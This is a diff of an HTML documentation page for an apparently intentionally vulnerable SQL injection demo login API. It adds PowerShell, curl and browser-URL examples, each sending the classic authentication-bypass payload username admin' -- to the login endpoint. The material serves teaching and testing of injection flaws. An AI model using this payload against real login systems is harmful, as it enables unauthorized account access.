@@ -132,10 +132,14 @@ Content-Type: application/json
   "username": "...",
   "password": "..."
 }</code></pre>
-        <p class="api-example-label">Quick Test via Console / Curl:</p>
-        <pre class="code-block"><code id="curlExample">curl -X POST https://sql-injection-sigma.vercel.app/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin'\'' --","password":"xyz"}'</code></pre>
+        <p class="api-example-label">Quick Test via PowerShell:</p>
+        <pre class="code-block"><code>Invoke-RestMethod -Uri "https://sql-injection-sigma.vercel.app/api/login" -Method Post -ContentType "application/json" -Body '{"username":"admin'' --","password":"xyz"}'</code></pre>
+
+        <p class="api-example-label">Quick Test via Bash / Curl:</p>
+        <pre class="code-block"><code>curl -X POST https://sql-injection-sigma.vercel.app/api/login -H "Content-Type: application/json" -d '{"username":"admin'\'' --","password":"xyz"}'</code></pre>
+
+        <p class="api-example-label">Or direct GET in browser URL bar:</p>
+        <pre class="code-block"><code>https://sql-injection-sigma.vercel.app/api/login?username=admin'%20--&password=xyz</code></pre>
       </div>
     </details>
 
